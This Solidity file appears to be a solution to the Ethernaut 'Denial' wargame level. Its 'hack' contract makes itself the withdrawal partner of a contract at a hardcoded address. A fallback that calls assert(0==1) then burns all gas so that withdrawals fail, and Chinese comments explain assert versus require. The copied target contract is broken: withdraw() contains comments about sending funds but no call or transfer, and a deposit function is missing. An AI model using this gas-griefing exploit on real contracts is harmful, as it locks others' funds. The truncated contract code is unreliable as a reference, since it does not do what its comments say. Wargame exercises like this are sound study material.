// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract hack {
    address instance_address = 0x32eF8629d2FA8D6953e938b444FE463A0367C22e;

    Denial a = Denial(instance_address);
    
    function hack1() public {
        a.setWithdrawPartner(address(this));
        a.withdraw();
    }

    function() payable {
        assert(0==1);
    }
    
}

//assert(false),编译为0xfe,这是一个无效的操作码，故将消耗掉所有剩余的gas，并恢复所有的操作
//require(false)编译为0xfd,这是revert()的操作码，它将退还所有剩余的gas，同时可以返回一个值（自定义的报错信息